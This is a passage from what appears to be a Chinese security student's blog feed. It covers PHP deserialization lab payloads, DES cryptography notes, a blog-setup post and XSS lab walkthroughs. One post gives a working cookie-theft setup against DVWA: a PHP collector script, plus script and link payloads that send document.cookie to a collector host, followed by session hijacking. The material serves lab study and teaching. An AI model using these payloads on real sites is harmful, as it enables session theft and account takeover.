class="line">http://192.168.31.9/9.php?id=O:7:%22student%22:3:&#123;s:4:%22name%22;s:3:%22yyy%22;s:12:%22%00student%00age%22;s:3:%22yyy%22;s:6:%22%00*%00sex%22;s:3:%22yyy%22;&#125;</span><br></pre></td></tr></table></figure><h6 id="实验八："><a href="#实验八：" class="headerlink" title="实验八："></a>实验八：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">class happy&#123; </span><br><span class="line">protected $file=&apos;index.php&apos;; </span><br><span class="line">public function __construct($file)&#123; </span><br><span class="line">$this-&gt;file=$file; </span><br><span class="line">&#125; </span><br><span class="line">function __destruct()&#123; </span><br><span class="line">if(!empty($this-&gt;file)) </span><br><span class="line">&#123; </span><br><span class="line">if(strchr($this-&gt;file,&quot;\\&quot;)===false &amp;&amp; strchr($this- </span><br><span class="line">&gt;file,&apos;/&apos;)===false) </span><br><span class="line">show_source(dirname(__FILE__).&apos;/&apos;.$this-&gt;file); </span><br><span class="line">else </span><br><span class="line">die(&apos;Wrong filename.&apos;); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">function __wakeup()&#123; </span><br><span class="line">$this-&gt;file=&apos;index.php&apos;; </span><br><span class="line">&#125; </span><br><span class="line">public function __toString() </span><br><span class="line">&#123; </span><br><span class="line">return &apos;&apos;; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">if (!isset($_GET[&apos;file&apos;]))&#123; </span><br><span class="line">show_source(&apos;index.php&apos;); </span><br><span class="line">&#125;</span><br><span class="line">else&#123; </span><br><span class="line">$file=base64_decode($_GET[&apos;file&apos;]); </span><br><span class="line">echo unserialize($file); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这段代码中有三个魔法函数，首先wakeup这个函数要绕过，会覆盖我们的注入，绕过方法前面已经使用过了</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;happy&quot;:2:&#123;S:7:&quot;\00*\00file&quot;;S:5:&quot;a.txt&quot;;&#125;</span><br></pre></td></tr></table></figure><p>Base64：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo1OiJoYXBweSI6Mjp7Uzo3OiJcMDAqXDAwZmlsZSI7Uzo1OiJhLnR4dCI7fQ==</span><br></pre></td></tr></table></figure><p>这个实验需要绕过的就是wakeup这个魔法方法，另外需要注意的是序列化格式，需要使用“\00”,还有S是大写，其他的就和前面一样了</p><p>关于大小写“s”</p><p>s：\00a   表示4个字符</p><p>S：\00a   表示2个字符</p>]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;序列化与反序列化&quot;&gt;&lt;a href=&quot;#序列化与反序列化&quot; class=&quot;headerlink&quot; title=&quot;序列化与反序列化&quot;&gt;&lt;/a&gt;序列化与反序列化&lt;/h5&gt;&lt;p&gt;序列化：把变量转换为课存储或课传输文本结构的过程&lt;/p&gt;
&lt;p&gt;反序列化：在合适的时候把序列化后的文本结构转化为原来的变量&lt;/p&gt;
&lt;p&gt;将变量对象持久化操作，让其离开内存保存在硬盘中，等到需要的时候，在从硬盘中加载变量对象到内存中，这样就可以大大节约内存地址&lt;/p&gt;
&lt;p&gt;意义：序列化和反序列的结合可以轻松的存储和传输数据，我们可以把对象序列化为不同的格式，json、XML、二进制、SOAP等&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://soliym.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="反序列化" scheme="http://soliym.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>单钥密码体制(一)</title>
    <link href="http://soliym.top/2021/06/19/%E5%8D%95%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6%E4%B8%80/"/>
    <id>http://soliym.top/2021/06/19/单钥密码体制一/</id>
    <published>2021-06-19T14:37:21.212Z</published>
    <updated>2019-11-24T09:57:33.605Z</updated>
    
    <content type="html"><![CDATA[<p>信息安全的两次变革：第一次是计算机的诞生，许多重要文件存储于计算机中，因此，计算机的主机安全就成为了一个重要的问题。第二次是计算机网络及分布式系统的诞生，人们利用网络对数据传输，在这个复杂且庞大的网络中，如何去传输重要数据，这又给信息安全带来新的问题和挑战。随着这些问题的解决，密码学也在不断的发展中。信息安全的四个目标：保密性、完整性、可用性、合法使用。</p><a id="more"></a><h3 id="一、单钥密码体制"><a href="#一、单钥密码体制" class="headerlink" title="一、单钥密码体制"></a>一、单钥密码体制</h3><p>单钥密码体制也称为私钥加密体制，因为通信双方采用的密码相同，因此，也称为对称加密体制，根据其加密算法的特点，可分为：分组密码和流密码。</p><p>古典密码：是一种简单的加密体制，它伴随着密码学的发展，它的思想对单钥密码体制影响深远，代换和置换思想，是单钥密码体制的基础。</p><p>密码学可分为古代密码、近代密码、现代密码，它有两个重要的时期，一是1949，密码学成为一门学科，二是1976年，公钥密码算法的出现。</p><p>密码学的进程：从单表代替到多表代替，再到机械码，以及现在的现代密码学，未来将会出现的量子密码学。</p><p>密码学中有一个重要的定律：伯格夫斯基定律：每一个密码都是可以破解的</p><p>虽然有些密码至今没有人可以破解，但是根据密码学的加密规则来说，密文都是根据一定的规则由明文加密而来，因此，密文肯定是可以破解的，只是时间和方法问题。</p><p>既然所有的密码都是可以破解的，那么机密算法的安全性在哪？</p><p>1、破译的成本超过加密信息性价值</p><p>2、破译的时间超过加密信息的生命周期</p><h3 id="二、分组密码DES"><a href="#二、分组密码DES" class="headerlink" title="二、分组密码DES"></a>二、分组密码DES</h3><h4 id="1、DES"><a href="#1、DES" class="headerlink" title="1、DES"></a>1、DES</h4><p>DES是一种分组加密算法，输入的明文为64位，密钥为56位，生成的密文分组长度为64位</p><h4 id="2、DES算法"><a href="#2、DES算法" class="headerlink" title="2、DES算法"></a>2、DES算法</h4><p>1、对输入分组进行固定的“初始置换”IP运算，可以将这个置换表示为：</p><p>  <img src="/2021/06/19/单钥密码体制一/01.png" alt="01"></p><p> 注意：这里L0和R0称为“左右半分组”，各为32比特。IP是固定的函数（即输入密钥不是它的参数），它是公开的。这个过程实际上为“扩散（ Diffusion ）”。</p><p>2、迭代运算，即将下面的运算迭代16轮</p><p><img src="/2021/06/19/单钥密码体制一/02.png" alt="02"></p><p>这个过程就是香农信息论中的“混淆”       </p><p>3、将16轮迭代后得到的结果（L16, R16）输入到IP的逆置换IP-1中：</p><p>注意：DES算法的加密和解密运算均采用这3个步骤。仅有的不同是：如果加密算法中使用的轮密钥次序为k1, k2, …, k16，那么解密算法中使用的密钥次序为：k16, k15, …, k1。   </p><p><img src="/2021/06/19/单钥密码体制一/03.png" alt="03"></p><p>加密流程：</p><p><img src="/2021/06/19/单钥密码体制一/04.png" alt="04"></p><p>3、密钥生成</p><p><img src="/2021/06/19/单钥密码体制一/05.png" alt="05"></p><p>4、迭代结构</p><p><img src="/2021/06/19/单钥密码体制一/06.png" alt="06"></p><p>DES的轮结构重点在于F函数，F函数将32bit明文扩展为48bit密文，然后在于密钥异或，再通过S盒的替换，压缩成32bit。</p><p>F函数中明文的扩展：将明文分为8*4的矩阵，在矩阵的左右两侧，各加入一列元素，元素生成规则为：元素空间为0到32，左侧一列为第一列元素-1，如果为-1，则为32，右侧一列+1模32</p><p>F函数中的密文压缩：通过8个s盒的代换，代换规则，将48bit密文分为8组，每组6bit，分别对应8个S盒，然后将每组的第一位和最后一位组成行，其他位组成列，然后查表替换。</p><h3 id="三、DES安全性"><a href="#三、DES安全性" class="headerlink" title="三、DES安全性"></a>三、DES安全性</h3><p>因为DES的密钥太短，因此不能抵抗穷举密钥搜索攻击，已被破解，但是它的思想影响了后来单钥密码体制的设计。</p><h3 id="四、DES的设计思想"><a href="#四、DES的设计思想" class="headerlink" title="四、DES的设计思想"></a>四、DES的设计思想</h3><p>DES的设计主要包含了扩散和混淆，这也是单钥加密算法中，分组密码的基本设计思想，扩散是将密钥对明文的影响尽可能多的去影响明文中的元素，使明文和密文的差别尽可能的大。混淆是将明文和密文的联系尽可能小，通过统计等手段，不能确定明文和密文之间的关系。</p><p>扩散和混淆的思想来源于古典密码中的置换和代换。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;信息安全的两次变革：第一次是计算机的诞生，许多重要文件存储于计算机中，因此，计算机的主机安全就成为了一个重要的问题。第二次是计算机网络及分布式系统的诞生，人们利用网络对数据传输，在这个复杂且庞大的网络中，如何去传输重要数据，这又给信息安全带来新的问题和挑战。随着这些问题的解决，密码学也在不断的发展中。信息安全的四个目标：保密性、完整性、可用性、合法使用。&lt;/p&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://soliym.top/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="密码学" scheme="http://soliym.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>建站分享</title>
    <link href="http://soliym.top/2021/06/19/%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    <id>http://soliym.top/2021/06/19/关于博客的搭建/</id>
    <published>2021-06-19T14:37:21.200Z</published>
    <updated>2019-03-29T15:27:24.299Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Github-Pages-Hexo"><a href="#Github-Pages-Hexo" class="headerlink" title="Github Pages + Hexo"></a>Github Pages + Hexo</h2><p>  我的博客是Github Pages + Hexo在github上搭建的。<br>  下面是我对搭建博客过程中的一些分享<br><a id="more"></a></p><h3 id="一、-Git、node-js"><a href="#一、-Git、node-js" class="headerlink" title="一、 Git、node.js"></a>一、 Git、node.js</h3><p>  先下载安装好<strong>Git、node.js</strong>，具体的过程参照了网上很多的帖子，很多都不是很详细，对于我这种小白来说就是一种折磨（完全看不懂，虽然学了一点前端的HTML、css、js，但这里完全用不上，到是在后面修改主题的时候到是能看明白了。。。。）这些博客里有一个挺详细的，按照他的过程，很容易就弄出来了（其实也不容易。。。。。出现好多问题，当时就很崩溃，明明按照他的步骤完成的，为啥就不通过呢，只能靠着百度一一解决了。。。<br>  <strong>这个帖子有点小错误，可能是环境和版本不同的原因吧</strong>（我搭建的时候有些地方会出错，需要自己去改）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://jantc.cn/2017/04/16/%E5%BB%BA%E7%AB%99%E5%88%86%E4%BA%AB%E4%B9%8BGithub%20Pages%20+%20Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%20(%E4%B8%80)/</span><br></pre></td></tr></table></figure><h3 id="二、Github"><a href="#二、Github" class="headerlink" title="二、Github"></a>二、Github</h3><p>  在github上申请免费的空间来搭建网页，以前西部数码上购买过一个虚拟主机，很贵，一年要几百大洋，主要是国内的主要备案很麻烦，后来就放弃了。在github上可以搭建一个简单的静态网页，虽然是静态的，但是也可以加入很多功能，比如评论、分享系统。用来写写博客或作为个人的自我接受很好用。没有繁琐的管理，搭建好以后只管写博客就好。<br>  <strong>注册GitHub的时候最好是在chrome浏览器中</strong>，因为可以翻译网页，像我这种还没过四级的渣渣，看见这些英文网站就头疼。。。。<br>  具体的注册步骤就不说了，反正我也是看着别人的帖子弄的。。。这个很容易网上就能找到（我忘了我是在按照那个弄的了）</p><h3 id="三、hexo"><a href="#三、hexo" class="headerlink" title="三、hexo"></a>三、hexo</h3><p>配置完hexo本地就算配置完成了，接下来就是将hexo托管到github。<br>  那个_config.yml有两个，<strong>一个是在hexo文件夹下的，另一个是在主题文件夹下的</strong>，一定要分清楚这两个，后面修改主题配置的时候会对这两个文件进行修改。<br>  到这基础的就弄完了，可以说有个简单的博客就搭建完了，不过这时候页面有点丑（太low而且没啥功能），接下来就是对博客的美化-主题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo g  </span><br><span class="line">hexo s  </span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><h3 id="四、主题"><a href="#四、主题" class="headerlink" title="四、主题"></a>四、主题</h3><p>我使用的是Material X作为博客的主题，想弄的话可以在我们博客的最下面点<strong>Material X</strong>连接，里面有关于这个主题的修改方法，在最下方有主题的源代码，下载后将文件放在主题文件夹中，上传就Ok了，具体的方法可以百度（有时间是话我会写篇文章来详细说一下我是怎样修改的和遇到的问题）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xaoxuu.com/blog/</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.wushile.top/</span><br></pre></td></tr></table></figure><h2 id="关于搭建博客"><a href="#关于搭建博客" class="headerlink" title="关于搭建博客"></a>关于搭建博客</h2><p>  博客搭建花了大概四天多的时间才完成对博客的简单搭建，第一次弄博客，遇到了很多很多的问题，几乎都快要放弃了，但想想已经花费的很多的时间去做这个博客，就该把它弄完，从无到有，很庆幸坚持到了最后，从一无所知的小白到完成搭建这个博客，学到了很多知识，在网上查找解决问题的时候也见识到了很多。很久都没有这么专注的去做一件事情，每天就想着一件事，就想把这个博客建好，现在终于把基础搭建完了，不足的地方以后再去修改，千里之行始于足下。这是第一次写博客，很多格式都不动，写的很low，没办法，这会已经快一点，也没时间去学了，明天还有课。这两周可能不会对博客再进行大的修改了，还有两周考数据结构，没时间去美化了，等考完试再去博客进行修改吧    </p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Github-Pages-Hexo&quot;&gt;&lt;a href=&quot;#Github-Pages-Hexo&quot; class=&quot;headerlink&quot; title=&quot;Github Pages + Hexo&quot;&gt;&lt;/a&gt;Github Pages + Hexo&lt;/h2&gt;&lt;p&gt;  我的博客是Github Pages + Hexo在github上搭建的。&lt;br&gt;  下面是我对搭建博客过程中的一些分享&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://soliym.top/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="hexo" scheme="http://soliym.top/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>xss攻击实例之cookie获取与登录</title>
    <link href="http://soliym.top/2021/06/19/xss%E6%94%BB%E5%87%BB%E5%AE%9E%E4%BE%8B%E4%B9%8Bcookie%E8%8E%B7%E5%8F%96%E4%B8%8E%E7%99%BB%E5%BD%95/"/>
    <id>http://soliym.top/2021/06/19/xss攻击实例之cookie获取与登录/</id>
    <published>2021-06-19T14:37:21.164Z</published>
    <updated>2020-05-17T08:43:51.520Z</updated>
    
    <content type="html"><![CDATA[<p>使用XSS漏洞盗取cookie,并绕过密码登录</p><a id="more"></a><p>首先环境的搭建，使用DVWA平台的XSS漏洞，这个DVWA的XSS漏洞在前面都讲过，所以我们直接使用LOW等级获取cookie，并保存在Web服务器上，这里使用LOW等级是为了方便，其他等级都是一样的做法，只是构造的脚本不同</p><p>使用脚本获取cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这是一个很简单的XSS漏洞，可以弹出用户的cookie，但是现在我们不是要将cookie弹出，而是将其保存在其他服务器上，我们可以获取到这个cookie，然后利用cookie绕过密码登录</p><p>首先我们编写一个可以获取cookie，并且保存为文件的php文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$cookie = $_GET[&apos;x&apos;];</span><br><span class="line"></span><br><span class="line">$myFile = &quot;cookie.txt&quot;;</span><br><span class="line"></span><br><span class="line">file_put_contents($myFile, $cookie);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>注意：要在目录下写创建或修改文件，一定要有写权限，一般目录的用户是root用户和用户组用户写权限，但是其他用户是没有的，就导致本地可以运行php创建文件，但是通过web就不可以，因为web是服务器平台权限，比如Apache搭建的网站，创建文件就是Apache用户</p><p>然后搭建一个我们的网站，用来接收cookie，将上述代码写入名为cookie.php的文件中，并存放在网站根目录下，保证我们可以访问到这个文件`</p><p>Cookie.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$cookie = $_GET[&apos;x&apos;];</span><br><span class="line"></span><br><span class="line">$myFile = &quot;cookie.txt&quot;;</span><br><span class="line"></span><br><span class="line">file_put_contents($myFile, $cookie);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>构造盗取cookie的脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location=&apos;http://192.168.31.9/cookie.php?x=&apos;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>输入js脚本，然后在网站根目录下查看，就可以看到cookie值了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHPSESSID=u49cvchncj11de0vgvnbu47fa3; security=low</span><br></pre></td></tr></table></figure><p>但是一般用户肯定是不会这样输入的，所以我们将在存储型XSS中在做实现</p><p>在low级别的XSS中是没有防护的，为了简单看效果，直接在message框内输入，因为有长度限制，所以右键检查元素，将最大长度改为200</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location=&apos;http://192.168.31.9/cookie.php?x=&apos;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>点击去确认就会触发xss漏洞，但是现在获取的是我们自己的，所以删除cookie.txt文件，然后退出DVWA，重新登录，然后点击存储型XSS，就会跳转，但是，DVWA的cookie是按照时间变化的，所以如果间隔较短的化，获取的cookie是一样的</p><p>使用cookie绕过密码登录</p><p>首先在DVWA界面下，修改cookie值</p><p>按下F12，在存储中找到cookie，修改cookie值，DVWA中的cookie包括两部分：cookie值和等级，都要修改</p><p>修改后直接访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.9:8088/security.php</span><br></pre></td></tr></table></figure><p>直接就可以访问，这样就绕过了用户密码登录</p><p>使用链接获取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;#&quot;</span><br><span class="line">onclick=document.location=&apos;http://192.168.31.9/cookie.php?x=&apos;+document.cookie;&gt;test3&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>点击链接就会触发xss漏洞，用户就可以获取</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用XSS漏洞盗取cookie,并绕过密码登录&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://soliym.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="XSS" scheme="http://soliym.top/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>xss-lab(11-18)详细讲解</title>
    <link href="http://soliym.top/2021/06/19/xss-lab(11-18)%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3/"/>
    <id>http://soliym.top/2021/06/19/xss-lab(11-18)详细讲解/</id>
    <published>2021-06-19T14:37:21.134Z</published>
    <updated>2020-05-06T09:13:33.692Z</updated>
    
    <content type="html"><![CDATA[<p>xss注入与sql注入有很多相似之处，如果有sql学习的基础，那么学习xss将会很轻松，xss注入的方法总的来说就方面，一方面从js脚本入手，如果js方面的防御机制，可以考虑绕过，或者选择html的标签中的事件属性注入，本文并没有涉及flash xss攻击，flash xss会作为单独一章，而且也没有涉及存储型xss攻击，关于存储型xss会在dvwa中讲到</p><a id="more"></a><h6 id="第11关："><a href="#第11关：" class="headerlink" title="第11关："></a>第11关：</h6><p>这一关与上一关一样，需要盲猜注入的变量，通过逐个试探，只有t_sort才可以，回显信息，所以通过T_sort注入</p><p>xss注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_sort=2&quot; accesskey=&quot;x&quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot;</span><br></pre></td></tr></table></figure><p>通过测试，并没有注入成功，所以T_sort并不是接受的变量</p><p>查看源代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_SERVER[&apos;HTTP_REFERER&apos;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br></pre></td></tr></table></figure><p>通过查看源代码，我们知道所有的变量都是迷惑攻击者的，真正的输入点是在http的头部的</p><p>使用bp抓包，然后修改http数据包的报头，注入代码</p><p>在http的头部加入referer字段，该字段的值为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2&quot; accesskey=&quot;x&quot; onload=&quot;alert(1)&quot; type=&quot;text&quot;</span><br></pre></td></tr></table></figure><p>然后页面会出现input框，点击后就会出现消息框</p><p>本关的防御机制是通过隐藏输入点，如果攻击者不知道源码的情况下很难注入</p><h6 id="第12关："><a href="#第12关：" class="headerlink" title="第12关："></a>第12关：</h6><p>这一关是有提示的，在html代码中的input下，变量名t_ua的值，是浏览器的版本，真好对应user-agent字段，所以猜测是通过http头部注入，上一关也应该是有的，不过没有注意到</p><p>注入方法与上一关一样：抓包-修改-注入代码</p><p>在http的头部修改user-agent字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;</span><br></pre></td></tr></table></figure><p>本关的防御机制与上一关一样</p><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$str11=$_SERVER[&apos;HTTP_USER_AGENT&apos;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br></pre></td></tr></table></figure><p>是对尖括号有过滤的，所以采用事件注入</p><h6 id="第13关："><a href="#第13关：" class="headerlink" title="第13关："></a>第13关：</h6><p>这一关没有提示，不能确定是否还是通过http注入，所以先试探几个变量是否可用。在试探的过程中发现T_cook是有内容的，所以我们猜测注入点是cookie</p><p>通过抓包发现，cookie处的内容确实是t_cookie显示的内容，所以修改cookie的值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=2&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;</span><br></pre></td></tr></table></figure><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_COOKIE[&quot;user&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br></pre></td></tr></table></figure><p>对尖括号有过滤，所以采用事件注入</p><h6 id="第14关："><a href="#第14关：" class="headerlink" title="第14关："></a>第14关：</h6><p>这一关，没有注入点，整个页面是一个静态页面</p><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;</span><br><span class="line">&lt;center&gt;&lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不</span><br><span class="line">会自动跳转。成功者&lt;a href=/xss/level15.php?src=1.gif&gt;点我进level15&lt;/a&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><h6 id="第15关："><a href="#第15关：" class="headerlink" title="第15关："></a>第15关：</h6><p>第15关html代码很少，找不到注入点，也不知道变量名，也没有提示，所以只能查看源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;src&quot;];</span><br><span class="line">echo &apos;&lt;body&gt;&lt;span class=&quot;ng-include:&apos;.htmlspecialchars($str).&apos;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以看到的是，变量名是“src”，这也没有提示，确实猜不到</p><p>通过试探，发现所有的输入都会被注视到 ngInclude: 1 之后，所以先了解一下 ngInclude它的作用</p><p>ng-include 指令用于包含外部的 HTML 文件。</p><p>包含的内容将作为指定元素的子节点。</p><p>ng-include 属性的值可以是一个表达式，返回一个文件名。</p><p>默认情况下，包含的文件需要包含在同一个域名下。</p><p>也就是说它的参数是一个html页面</p><p>先输入一个php页面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level15.php?src=&apos;level1.php&apos;</span><br></pre></td></tr></table></figure><p>发现在该页面会加载level1的页面，我们在15页面里面是没有注入点，但是在1页面里面有，尝试在1里面注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src=&apos;level1.php?name=1&lt;script&gt;alert(1)&lt;/script&gt;&apos;</span><br></pre></td></tr></table></figure><p>并没有被执行，因为通过htmlspecialchars($str)函数，有些特殊字符被转码了，转为了html实体，所以我们采用其他标签的事件属性触发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src=&apos;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&apos;</span><br></pre></td></tr></table></figure><h6 id="第16关："><a href="#第16关：" class="headerlink" title="第16关："></a>第16关：</h6><p>首先试探输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>其中script被过滤了，然后大小写输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure><p>大小写也被过滤了，嵌套写入</p><p>嵌套的部分被替换成了空格</p><p>换标签输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><p>空格也被编码了</p><p>空格采用url编码输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%0Asrc=1%0Aonerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 